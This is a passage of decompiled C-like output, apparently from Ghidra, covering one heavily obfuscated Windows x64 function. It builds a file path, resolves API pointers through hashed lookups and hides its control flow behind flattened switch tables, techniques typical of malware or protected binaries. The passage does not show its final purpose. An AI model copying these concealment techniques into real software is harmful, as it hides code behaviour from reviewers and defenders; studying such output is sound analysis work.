  undefined2 uVar5;
  byte bVar6;
  int iVar7;
  undefined4 uVar8;
  int iVar9;
  byte *pbVar10;
  code *pcVar11;
  undefined8 *puVar12;
  code *pcVar13;
  code *pcVar14;
  undefined8 uVar15;
  undefined8 uVar16;
  undefined4 *puVar17;
  longlong lVar18;
  uint uVar19;
  uint uVar20;
  uint uVar21;
  uint uVar22;
  ulonglong uVar23;
  ulonglong uVar24;
  longlong lVar25;
  ulonglong uVar26;
  undefined8 in_stack_fffffffffffffce8;
  ulonglong uStack_2f8;
  HMODULE pHStack_2f0;
  ulonglong uStack_2e8;
  ulonglong *puStack_2e0;
  char local_2d1;
  char local_2d0;
  undefined1 local_2cf;
  char local_2ce;
  char local_2cd;
  char local_2cc;
  char local_2cb;
  char local_2ca;
  char local_2c9;
  code *pcStack_2c8;
  ushort local_2be;
  ushort local_2bc;
  ushort local_2ba;
  code *pcStack_2b8;
  ulonglong uStack_2b0;
  int local_2a4;
  int local_2a0;
  uint local_29c;
  int local_298;
  undefined4 uStack_294;
  int local_290;
  int local_28c;
  undefined8 uStack_288;
  undefined8 uStack_280;
  undefined2 uStack_278;
  undefined2 uStack_276;
  undefined4 uStack_274;
  undefined4 uStack_270;
  undefined4 uStack_26c;
  undefined4 uStack_268;
  undefined4 uStack_264;
  undefined4 uStack_260;
  undefined4 uStack_25c;
  undefined4 uStack_258;
  undefined4 uStack_254;
  undefined4 uStack_250;
  undefined4 uStack_24c;
  undefined4 uStack_248;
  undefined1 auStack_244 [8];
  undefined1 auStack_23c [8];
  undefined1 auStack_234 [8];
  undefined1 auStack_22c [8];
  undefined1 auStack_224 [8];
  undefined1 auStack_21c [8];
  undefined1 auStack_214 [8];
  undefined8 uStack_20c;
  undefined8 uStack_204;
  undefined8 uStack_1fc;
  code *pcStack_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  ulonglong local_60;
  undefined8 local_58;
  undefined8 local_50;
  longlong local_48;
  
  uVar21 = (uint)((ulonglong)in_stack_fffffffffffffce8 >> 0x20);
  FUN_140011d10();
  local_2ca = -0x17;
  local_2d0 = -0x3d;
  local_290 = -0x7b4b757b;
  local_2cc = '!';
  local_2ba = 0xffd6;
  local_28c = -0x3a54b940;
  local_2a0 = -0x28171b7b;
  local_298 = 0x16b6668d;
  local_58 = 0x939e1bafd4a8ca08;
  local_2cf = 0x43;
  local_2ce = -0x61;
  local_70 = 0x6f0faa86f62c93e1;
  local_2d1 = 'k';
  local_48 = -0x11;
  local_2cb = '_';
  local_78 = 0xb4cb17981b82007c;
  local_2a4 = -0x3a54b920;
  local_2be = 0xeec3;
  local_29c = 0x2239fcf0;
  local_60 = 0xa94abbfc6aca32e8;
  local_2bc = 0xb189;
  local_50 = 0x5e2af52e3b53d444;
  local_2cd = 'U';
  local_68 = 0xa50ec3f821386e84;
  local_2c9 = -0x2b;
  uVar26 = *(ulonglong *)
            (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 0x70);
  pbVar10 = FUN_14000fc7a(0,0x2e);
  puVar17 = &UNK_14008a970;
  if (pbVar10 == (byte *)0x0) {
    puVar17 = &UNK_14008a940;
  }
                    /* WARNING: Switch is manually overridden */
  switch(*puVar17) {
  case 0x16cf:
    pbVar10[0x1e] = 's';
    pbVar10[0x1f] = '\\';
    pbVar10[0x20] = 'c';
    pbVar10[0x21] = 'l';
    pbVar10[0x22] = 'u';
    pbVar10[0x23] = 'i';
    pbVar10[0x24] = 's';
    pbVar10[0x25] = 'h';
    pbVar10[0x26] = 'o';
    pbVar10[0x27] = 'o';
    pbVar10[0x28] = 'n';
    pbVar10[0x29] = 'd';
    pbVar10[0x2a] = '.';
    pbVar10[0x2b] = 't';
    pbVar10[0x2c] = 'x';
    pbVar10[0x2d] = 't';
    pbVar10[0x10] = '\\';
    pbVar10[0x11] = 'v';
    pbVar10[0x12] = 'e';
    pbVar10[0x13] = 'n';
    pbVar10[0x14] = 't';
    pbVar10[0x15] = 'r';
    pbVar10[0x16] = 'i';
    pbVar10[0x17] = 'l';
    pbVar10[0x18] = 'o';
    pbVar10[0x19] = 'q';
    pbVar10[0x1a] = 'u';
    pbVar10[0x1b] = 'i';
    pbVar10[0x1c] = 's';
    pbVar10[0x1d] = 't';
    pbVar10[0x1e] = 's';
    pbVar10[0x1f] = '\\';
    pbVar10[0] = 'C';
    pbVar10[1] = ':';
    pbVar10[2] = '\\';
    pbVar10[3] = 'P';
    pbVar10[4] = 'r';
    pbVar10[5] = 'o';
    pbVar10[6] = 'g';
    pbVar10[7] = 'r';
    pbVar10[8] = 'a';
    pbVar10[9] = 'm';
    pbVar10[10] = ' ';
    pbVar10[0xb] = 'F';
    pbVar10[0xc] = 'i';
    pbVar10[0xd] = 'l';
    pbVar10[0xe] = 'e';
    pbVar10[0xf] = 's';
    FUN_1400120bc(&uStack_288,pbVar10,(HANDLE)0x2e);
    pvVar2 = (LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
    lVar25 = 0xb0;
    if (CONCAT44(uStack_280._4_4_,(uint)uStack_280) == (uVar26 ^ 0xabbfe626d22d2a86)) {
      lVar25 = 4;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0x856:
                    /* WARNING: Switch is manually overridden */
      switch((uint)uStack_288 & 3) {
      case 1:
        (**(code **)((longlong)pvVar2 + 7))((longlong)pvVar2 + -1);
        break;
      case 3:
      }
      break;
    case 0xc97:
      FUN_140001280(pvVar2,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
    }
    uVar20 = (uint)uVar26;
    FUN_140001280(pbVar10,(ulonglong)(uVar20 ^ 0x2dd2d557),1,1);
    pHStack_2f0 = (HMODULE)0xa2239d178e119680;
    uStack_288._0_4_ = 0x40089fe1;
    uStack_288._4_4_ = 1;
    uStack_280._0_4_ = uVar20 ^ 0x2dd2d561;
    uStack_280._4_4_ = 0;
    uStack_278 = SUB82(&pHStack_2f0,0);
    uStack_276 = (undefined2)((ulonglong)&pHStack_2f0 >> 0x10);
    uStack_274 = (undefined4)((ulonglong)&pHStack_2f0 >> 0x20);
    puVar17 = (undefined4 *)&UNK_14008a968;
    if (_DAT_1400df540 == 0x2e - (uVar20 ^ 0x2dd2d557)) {
      puVar17 = (undefined4 *)&UNK_14008a8b0;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar17) {
    case 0x2fca:
      FUN_140022c50(0x1400df528,&uStack_288);
    }
    FUN_1400115e2(&uStack_288,_DAT_1400df528,_DAT_1400df538);
    uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
    uStack_2f8 = uVar26 ^ 0xe72e147eae59f17c;
    pHStack_2f0 = (HMODULE)0x14008a639;
    *(undefined8 *)
     ((longlong)&pHStack_2f0 +
     (ulonglong)(byte)((char)(uVar26 ^ 0xabbfe626d22d2a86) + local_2c9 + 0x34)) = 0x20;
    lVar25 = 0x20;
    if (_DAT_1400df580 == -0x7c74dbfb - (int)uStack_2f8) {
      lVar25 = 0xec;
    }
    puStack_2e0 = &uStack_2f8;
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0x310e:
      FUN_140022c50(0x1400df568,&pHStack_2f0);
    }
    FUN_1400115e2(&pHStack_2f0,_DAT_1400df568,_DAT_1400df578);
    pHVar3 = pHStack_2f0;
    pcStack_2c8 = (code *)FUN_14000ff70(uVar20 + 0x97d8715f,uVar15,-0x4a29b098,pHStack_2f0);
    FUN_140001280(pHVar3,uStack_2e8,1,1);
    FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                  *(longlong *)(auStack_244 + ((ulonglong)(uVar20 + 0xd22d2a8f) - 0x44)),1,1);
    uStack_2f8 = 0xcbb35cd33e856ccd;
    uStack_288._0_4_ = 0x4008a602;
    uStack_288._4_4_ = 1;
    *(undefined8 *)(auStack_244 + ((ulonglong)(uVar20 + 0xd22d2a8f) - 0x44)) = 0x18;
    uStack_278 = SUB82(&uStack_2f8,0);
    uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
    uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
    lVar25 = 0xdc;
    if (_DAT_1400df108 == -0x3a54b928 - (uVar20 + 0x97d8715f)) {
      lVar25 = 0x108;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0x1ce4:
      FUN_140022c50(0x1400df0f0,&uStack_288);
    }
    FUN_1400115e2(&pHStack_2f0,_DAT_1400df0f0,_DAT_1400df100);
    pHVar3 = pHStack_2f0;
    uStack_2f8 = 0xce713b37a716bd9d;
    uStack_288._0_4_ = 0x400895ba;
    uStack_288._4_4_ = 1;
    uStack_280._0_4_ = 0x1f;
    uStack_280._4_4_ = 0;
    *(ulonglong **)(auStack_244 + ((ulonglong)(uVar20 + 0xd22d2a97) - 0x44)) = &uStack_2f8;
    puVar17 = (undefined4 *)&UNK_14008a9bc;
    if (_DAT_1400df800 == 0) {
      puVar17 = (undefined4 *)&UNK_14008a87c;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar17) {
    case 0x13b8:
      FUN_140022c50(0x1400df7e8,&uStack_288);
    }
    FUN_1400115e2(&uStack_288,_DAT_1400df7e8,_DAT_1400df7f8);
    pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
    uVar19 = uVar20 ^ 0xe87993a1;
    pcStack_2b8 = (code *)FUN_14000ff70(uVar19,pHVar3,-0x404a0eb5,pHVar1);
    FUN_140001280(pHVar1,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
    FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
    pHStack_2f0 = (HMODULE)((ulonglong)uVar19 ^ 0xa31e3d8ba34ea77a);
    uStack_288._0_4_ = 0x40088e82;
    uStack_288._4_4_ = 1;
    uStack_280._0_4_ = -0x3a54b910 - uVar19;
    uStack_280._4_4_ = 0;
    *(HMODULE **)(auStack_244 + ((ulonglong)(uVar19 + 0x3a54b938) - 0x44)) = &pHStack_2f0;
    puVar17 = (undefined4 *)&UNK_14008a918;
    if (_DAT_1400df080 == 0) {
      puVar17 = (undefined4 *)&UNK_14008a990;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar17) {
    case 0x1993:
      FUN_140022c50(0x1400df068,&uStack_288);
    }
    FUN_1400115e2(&uStack_288,_DAT_1400df068,_DAT_1400df078);
    uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
    uStack_2f8 = 0x5a8cdb1d69fcc6c5;
    pHStack_2f0 = (HMODULE)0x14008a152;
    uVar22 = uVar20 ^ 0x2dd2d571;
    *(undefined8 *)((longlong)&pHStack_2f0 + (ulonglong)uVar22) = 0x1d;
    lVar25 = 0x1a0;
    if (_DAT_1400dfb10 == (uVar19 + 0x3a54b938 ^ (uVar19 ^ uVar22 ^ (uint)local_68) + 0x1b6cd7bc)) {
      lVar25 = 100;
    }
    puStack_2e0 = &uStack_2f8;
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0x3364:
      FUN_140022c50(0x1400dfaf8,&pHStack_2f0);
    }
    FUN_1400115e2(&pHStack_2f0,_DAT_1400dfaf8,_DAT_1400dfb08);
    pHVar3 = pHStack_2f0;
    pcStack_80 = (code *)FUN_14000ff70(-0x3a54b928,uVar15,uVar20 ^ 0x246dfc60,pHStack_2f0);
    FUN_140001280(pHVar3,uStack_2e8,1,1);
    FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                  CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
    uVar23 = (ulonglong)(uVar20 ^ 0x246dfc60) + 0x301c06d07f1e5a8a;
    uStack_288._0_4_ = 0x4008a03c;
    uStack_288._4_4_ = 1;
    uStack_280._0_4_ = 0x18;
    uStack_280._4_4_ = 0;
    uStack_278 = SUB82(&uStack_2f8,0);
    uVar4 = uStack_278;
    uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
    uVar5 = uStack_276;
    uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
    uVar8 = uStack_274;
    uVar20 = uVar20 ^ 0x2dd2d579;
    puVar17 = (undefined4 *)&UNK_14008a954;
    if (_DAT_1400df038 == uVar20) {
      puVar17 = (undefined4 *)&UNK_14008a870;
    }
    uStack_2f8 = uVar23;
                    /* WARNING: Switch is manually overridden */
    switch(*puVar17) {
    case 0x31ef:
      FUN_140022c50(0x1400df020,&uStack_288);
    }
    FUN_1400115e2(&pHStack_2f0,_DAT_1400df020,_DAT_1400df030);
    pHVar3 = pHStack_2f0;
    uVar24 = uVar26 ^ 0xfb55634fee1366e5;
    uStack_288._0_4_ = 0x400891f4;
    uStack_288._4_4_ = 1;
    uStack_280._0_4_ = 0x17;
    uStack_280._4_4_ = 0;
    lVar25 = 0x10c;
    if (_DAT_1400df5e8 == (byte)(((byte)uVar22 ^ (byte)uVar23) + (local_2cd - (char)uVar20))) {
      lVar25 = 0x220;
    }
    uStack_2f8 = uVar24;
    uStack_2b0 = uVar26;
    uStack_278 = uVar4;
    uStack_276 = uVar5;
    uStack_274 = uVar8;
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0x2156:
      FUN_140022c50(0x1400df5d0,&uStack_288);
    }
    FUN_1400115e2(&uStack_288,_DAT_1400df5d0,_DAT_1400df5e0);
    pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
    uVar19 = (int)local_50 + (int)uVar24 * -2;
    pcVar14 = (code *)FUN_14000ff70(-0x3a54b928,pHVar3,uVar19,pHVar1);
    FUN_140001280(pHVar1,*(longlong *)(auStack_244 + ((ulonglong)(uVar19 ^ 0xb3d06d04) - 0x44)),1,1)
    ;
    FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
    uVar15 = (*pcStack_2c8)();
    uStack_288._0_4_ = 0;
    uStack_288._4_4_ = 0;
    uVar16 = (*pcStack_2b8)();
    iVar9 = (*pcStack_80)(uVar15,uVar16,uVar15,&uStack_288,(ulonglong)uVar21 << 0x20,0,2);
    lVar25 = 0x14c;
    if (iVar9 == 0) {
      lVar25 = 0xd8;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0x2fe3:
      (*pcVar14)(CONCAT44(uStack_288._4_4_,(uint)uStack_288));
    }
    uVar26 = uStack_2b0;
    pHStack_2f0 = (HMODULE)0xa99c3893458f6132;
    uStack_288._0_4_ = 0x40089636;
    uStack_288._4_4_ = 1;
    uStack_280._0_4_ = 0x15;
    uStack_280._4_4_ = 0;
    uVar21 = (uint)uStack_2b0;
    *(HMODULE **)(auStack_244 + ((ulonglong)(uVar21 + 0xd22d2a97) - 0x44)) = &pHStack_2f0;
    lVar25 = 0x244;
    if (_DAT_1400defd0 ==
        (((uint)*(undefined8 *)
                 (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) + 8
                 ) ^ uVar19) + (int)uVar24 ^ uVar19) - (uVar20 - (uVar21 + 0xd22d2a97))) {
      lVar25 = 0x1e8;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0x271a:
      FUN_140022c50(0x1400defb8,&uStack_288);
    }
    FUN_1400115e2(&uStack_288,_DAT_1400defb8,_DAT_1400defc8);
    uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
    uStack_2f8 = uVar26 ^ 0x4ed297adf5b9cf81;
    pHStack_2f0 = (HMODULE)&UNK_140089d86;
    uStack_2e8 = 0x27;
    puStack_2e0 = &uStack_2f8;
    lVar25 = 0xb4;
    if (_DAT_1400def10 == (int)uStack_2f8 + 0x2794e508) {
      lVar25 = 0x13c;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0x431:
      FUN_140022c50(0x1400deef8,&pHStack_2f0);
    }
    FUN_1400115e2(&pHStack_2f0,_DAT_1400deef8,_DAT_1400def08);
    pHVar3 = pHStack_2f0;
    pcVar14 = (code *)FUN_14000ff70(uVar21 ^ 0x6fb006f7,uVar15,uVar21 ^ 0xf004f850,pHStack_2f0);
    FUN_140001280(pHVar3,*(longlong *)
                          ((longlong)&pHStack_2f0 + (ulonglong)(0x4262d396 - (uVar21 ^ 0x6fb006f7)))
                  ,1,1);
    FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                  CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
    uVar20 = (*pcVar14)(0,0);
    uStack_258 = 0;
    uStack_254 = 0;
    uStack_250 = 0;
    uStack_24c = 0;
    uStack_268 = 0;
    uStack_264 = 0;
    uStack_260 = 0;
    uStack_25c = 0;
    uStack_278 = 0;
    uStack_276 = 0;
    uStack_274 = 0;
    uStack_270 = 0;
    uStack_26c = 0;
    uStack_288._0_4_ = 0;
    uStack_288._4_4_ = 0;
    uStack_280._0_4_ = 0;
    uStack_280._4_4_ = 0;
    lVar25 = 0x180;
    if (0 < (int)uVar20) {
      lVar25 = 0x88;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0x25af:
      uVar19 = 8;
      if (uVar20 < 8) {
        uVar19 = uVar20;
      }
      (*pcVar14)(uVar19,&uStack_288);
    }
    pHStack_2f0 = (HMODULE)0xaea4da21b768d458;
    uStack_288._0_4_ = 0x4008a2a7;
    uStack_288._4_4_ = 1;
    uStack_280._0_4_ = 0x18;
    uStack_280._4_4_ = 0;
    *(HMODULE **)(auStack_244 + ((ulonglong)(uVar21 ^ 0x2dd2d569) - 0x44)) = &pHStack_2f0;
    puVar17 = (undefined4 *)&UNK_14008a90c;
    if (_DAT_1400df228 == 0) {
      puVar17 = (undefined4 *)&UNK_14008a8c0;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar17) {
    case 0x5ac:
      FUN_140022c50(0x1400df210,&uStack_288);
    }
    FUN_1400115e2(&uStack_288,_DAT_1400df210,_DAT_1400df220);
    uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
    uStack_2f8 = 0x76d7500b7ce276f8;
    pHStack_2f0 = (HMODULE)&UNK_14008a09e;
    uStack_2e8 = 0x1f;
    *(ulonglong **)((longlong)&pHStack_2f0 + (ulonglong)(uVar21 ^ 0x2dd2d569)) = &uStack_2f8;
    lVar25 = 0x238;
    if (_DAT_1400df468 == (uVar21 ^ 0x2dd2d579)) {
      lVar25 = 0x1b0;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0xfffffe72:
      FUN_140022c50(0x1400df450,&pHStack_2f0);
    }
    FUN_1400115e2(&pHStack_2f0,_DAT_1400df450,_DAT_1400df460);
    pHVar3 = pHStack_2f0;
    iVar9 = (int)_DAT_1400dfa28 - (uVar21 ^ 0x2dd2d579);
    uVar20 = iVar9 + 0x124d2c59;
    pcStack_2c8 = (code *)FUN_14000ff70(uVar20,uVar15,iVar9 + 0xc57d6cc,pHStack_2f0);
    FUN_140001280(pHVar3,*(longlong *)((longlong)&pHStack_2f0 + (ulonglong)(0xc5ab46e0 - uVar20)),1,
                  1);
    FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                  *(longlong *)(auStack_244 + ((ulonglong)(uVar20 ^ 0xc5ab46d0) - 0x44)),1,1);
    uStack_2f8 = 0xd11f84ece7a459aa;
    uStack_288._0_4_ = 0x4008a513;
    uStack_288._4_4_ = 1;
    uStack_280._0_4_ = 0x18;
    uStack_280._4_4_ = 0;
    uStack_278 = SUB82(&uStack_2f8,0);
    uVar4 = uStack_278;
    uStack_276 = (undefined2)((ulonglong)&uStack_2f8 >> 0x10);
    uVar5 = uStack_276;
    uStack_274 = (undefined4)((ulonglong)&uStack_2f8 >> 0x20);
    uVar8 = uStack_274;
    lVar25 = 0x44;
    if (_DAT_1400df208 == 0) {
      lVar25 = 0x130;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0x2f0c:
      FUN_140022c50(0x1400df1f0,&uStack_288);
    }
    FUN_1400115e2(&pHStack_2f0,_DAT_1400df1f0,_DAT_1400df200);
    pHVar3 = pHStack_2f0;
    uStack_2f8 = 0xac2e3bffefcd4574;
    uStack_288._0_4_ = 0x40089eb0;
    uStack_288._4_4_ = 1;
    lVar25 = *(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8);
    uStack_280._0_4_ =
         ~(((uint)*(undefined8 *)(lVar25 + 0x80) ^
           (uint)*(undefined8 *)(lVar25 + 0xf0) ^ (uint)local_2bc) * 0x2543) & 0xffff;
    uStack_280._4_4_ = 0;
    *(ulonglong **)(auStack_244 + ((ulonglong)(0x27 - (uint)uStack_280) - 0x44)) = &uStack_2f8;
    puVar17 = (undefined4 *)&UNK_14008a9b8;
    if (_DAT_1400df840 == 0) {
      puVar17 = (undefined4 *)&UNK_14008a814;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar17) {
    case 0x197a:
      FUN_140022c50(0x1400df828,&uStack_288);
    }
    FUN_1400115e2(&uStack_288,_DAT_1400df828,_DAT_1400df838);
    pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
    pcVar14 = (code *)FUN_14000ff70(-0x3a54b928,pHVar3,-0x2e67acf5,pHVar1);
    FUN_140001280(pHVar1,*(longlong *)(auStack_244 + ((ulonglong)(uVar21 + 0xd22d2a8f) - 0x44)),1,1)
    ;
    FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
    uStack_2f8 = 0x9f11b854e875cc65;
    uStack_288._0_4_ = 0x40088f9a;
    uStack_288._4_4_ = 1;
    *(undefined8 *)(auStack_244 + ((ulonglong)(ushort)(uVar21 + 0xd22d2a8f) - 0x44)) = 0x18;
    lVar25 = 0x224;
    if (_DAT_1400df8e0 == uVar21 + 0xd22d2a87) {
      lVar25 = 0x1ac;
    }
    uStack_278 = uVar4;
    uStack_276 = uVar5;
    uStack_274 = uVar8;
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0x2709:
      FUN_140022c50(0x1400df8c8,&uStack_288);
    }
    FUN_1400115e2(&pHStack_2f0,_DAT_1400df8c8,_DAT_1400df8d8);
    pHVar3 = pHStack_2f0;
    uStack_2f8 = 0xe547af85bf632976;
    uStack_288._0_4_ = 0x4008a3b8;
    uStack_288._4_4_ = 1;
    *(undefined8 *)(auStack_244 + ((ulonglong)(uVar21 ^ 0x2dd2d571) - 0x44)) = 0x22;
    *(ulonglong **)(auStack_244 + ((ulonglong)(uVar21 ^ 0x2dd2d569) - 0x44)) = &uStack_2f8;
    puVar17 = (undefined4 *)&UNK_14008a844;
    if (_DAT_1400df398 == 0) {
      puVar17 = (undefined4 *)&UNK_14008a8d4;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar17) {
    case 0x2014:
      FUN_140022c50(0x1400df380,&uStack_288);
    }
    FUN_1400115e2(&uStack_288,_DAT_1400df380,_DAT_1400df390);
    pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
    pcVar13 = (code *)FUN_14000ff70(-0x3a54b928,pHVar3,0x62b0d3a6,pHVar1);
    FUN_140001280(pHVar1,CONCAT44(uStack_280._4_4_,(uint)uStack_280),1,1);
    FUN_140001280(pHStack_2f0,uStack_2e8,1,1);
    uVar15 = (*pcStack_2c8)();
    (*pcVar14)(uVar15);
    (*pcVar13)();
    uStack_2f8 = 0x6b430f5a23ecf77;
    uStack_288._0_4_ = 0x4008a487;
    uStack_288._4_4_ = 1;
    uStack_280 = (ulonglong)(uVar21 ^ 0x2dd2d569) + (_DAT_1400dfb18 ^ local_60) * 0x46571fcf92337a87
    ;
    uVar20 = (uint)uStack_280;
    *(ulonglong **)
     (auStack_244 +
     ((ulonglong)
      (((uint)*(undefined8 *)
               (*(longlong *)((longlong)ThreadLocalStoragePointer + (ulonglong)_tls_index * 8) +
               0xa8) ^ local_29c) * -0x7a76a801 ^ 0xc51f6b22) - 0x44)) = &uStack_2f8;
    puVar17 = (undefined4 *)&UNK_14008a9f0;
    if (_DAT_1400df720 == (uVar20 ^ 0x18)) {
      puVar17 = (undefined4 *)&UNK_14008a8e4;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar17) {
    case 0x2c99:
      FUN_140022c50(0x1400df708,&uStack_288);
    }
    FUN_1400115e2(&pHStack_2f0,_DAT_1400df708,_DAT_1400df718);
    pHVar3 = pHStack_2f0;
    uStack_2f8 = 0xa54a016f2cb040d;
    uStack_288._0_4_ = 0x4008a2e1;
    uStack_288._4_4_ = 1;
    uVar20 = 0x2dd2d581 - uVar21;
    *(undefined8 *)(auStack_244 + ((ulonglong)uVar20 - 0x44)) = 0x18;
    *(ulonglong **)(auStack_244 + ((ulonglong)(0x18 - uVar20) - 0x44)) = &uStack_2f8;
    puVar17 = (undefined4 *)&UNK_14008a834;
    if (_DAT_1400df920 == 0) {
      puVar17 = (undefined4 *)&UNK_14008a944;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar17) {
    case 0xd56:
      FUN_140022c50(0x1400df908,&uStack_288);
    }
    FUN_1400115e2(&uStack_288,_DAT_1400df908,_DAT_1400df918);
    pHVar1 = (HMODULE)CONCAT44(uStack_288._4_4_,(uint)uStack_288);
    uVar21 = 0xf37e1c51 - uVar21;
    pcVar14 = (code *)FUN_14000ff70(uVar21,pHVar3,0x63e40502,pHVar1);
    FUN_140001280(pHVar1,uStack_280,1,1);
    uVar19 = 0xc5ab46e0 - uVar21;
    FUN_140001280(pHStack_2f0,*(longlong *)((longlong)&pHStack_2f0 + (ulonglong)uVar19),1,1);
    pHStack_2f0 = (HMODULE)(-0x2c088b24ada8a877 - (ulonglong)uVar21);
    uStack_288._0_4_ = 0x40088fb2;
    uStack_288._4_4_ = 1;
    *(undefined8 *)(auStack_244 + ((ulonglong)(uVar19 & 0xff) - 0x44)) = 0x18;
    uStack_278 = SUB82(&pHStack_2f0,0);
    uStack_276 = (undefined2)((ulonglong)&pHStack_2f0 >> 0x10);
    uStack_274 = (undefined4)((ulonglong)&pHStack_2f0 >> 0x20);
    lVar25 = 0x8c;
    if (_DAT_1400df148 == 0) {
      lVar25 = 0x21c;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*(undefined4 *)(&UNK_14008a7ec + lVar25)) {
    case 0xfffffe80:
      FUN_140022c50(0x1400df130,&uStack_288);
    }
    FUN_1400115e2(&uStack_288,_DAT_1400df130,_DAT_1400df140);
    uVar15 = CONCAT44(uStack_288._4_4_,(uint)uStack_288);
    uStack_2f8 = 0xf50e003d79ea9b6;
    pHStack_2f0 = (HMODULE)0x14008a670;
    uVar20 = uVar20 + (0x18 - uVar20) + ((uint)DAT_1400df4a0 ^ local_2be + 0x5da4) & 0xffff;
    uStack_2e8 = (ulonglong)uVar20;
    *(ulonglong **)((longlong)&pHStack_2f0 + (ulonglong)(0x27 - uVar20)) = &uStack_2f8;
    puVar17 = (undefined4 *)&UNK_14008a950;
    if (_DAT_1400df168 == (uVar20 ^ 0x17)) {
      puVar17 = (undefined4 *)&UNK_14008a924;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar17) {
    case 0xe48:
      FUN_140022c50(0x1400df150,&pHStack_2f0);
    }
    FUN_1400115e2(&pHStack_2f0,_DAT_1400df150,_DAT_1400df160);
    pHVar3 = pHStack_2f0;
    iVar9 = uVar19 - local_2a4;
    pcVar13 = (code *)FUN_14000ff70(-iVar9,uVar15,((uint)DAT_1400df4a0 ^ (uint)local_78) - uVar21,
                                    pHStack_2f0);
    FUN_140001280(pHVar3,uStack_2e8,1,1);
    FUN_140001280((LPVOID)CONCAT44(uStack_288._4_4_,(uint)uStack_288),
                  *(longlong *)(auStack_244 + ((ulonglong)(-iVar9 ^ 0xc5ab46d0) - 0x44)),1,1);
    puVar12 = FUN_14000fc7a(0,0x10);
    uVar26 = uStack_2b0;
    puVar17 = (undefined4 *)&UNK_14008a984;
    if (puVar12 == (undefined8 *)0x0) {
      puVar17 = (undefined4 *)&UNK_14008a9ac;
    }
                    /* WARNING: Switch is manually overridden */
    switch(*puVar17) {
    case 0xfffffaac:
      *puVar12 = 0x63616379746f6f62;
      puVar12[1] = 0x73756f6e6f68706f;
      uStack_288._0_4_ = (uint)puVar12;
      uStack_288._4_4_ = (undefined4)((ulonglong)puVar12 >> 0x20);
      uVar20 = (uint)uStack_2b0;
      uVar21 = 0x2dd2d581 - uVar20;
      *(undefined8 **)(auStack_244 + ((ulonglong)uVar21 - 0x44)) = puVar12 + 2;
      uStack_278 = 0;
      *(undefined2 *)(auStack_244 + ((ulonglong)(uVar21 ^ 0x10) - 0x44)) = 1;
      *(undefined2 *)(auStack_244 + ((ulonglong)(0x22 - uVar21) - 0x44)) = 0;
      FUN_140008f9d((longlong *)&pHStack_2f0,&uStack_288);
      FUN_140001280(puVar12,0x10,1,1);
      pHVar3 = pHStack_2f0;
      lVar25 = (*pcVar14)(0,0,pHStack_2f0);
      lVar18 = 0xf4;
      if (lVar25 == 0) {
        lVar18 = 0x160;
      }
                    /* WARNING: Switch is manually overridden */
      switch(*(undefined4 *)(&UNK_14008a7ec + lVar18)) {
      case 0x2981:
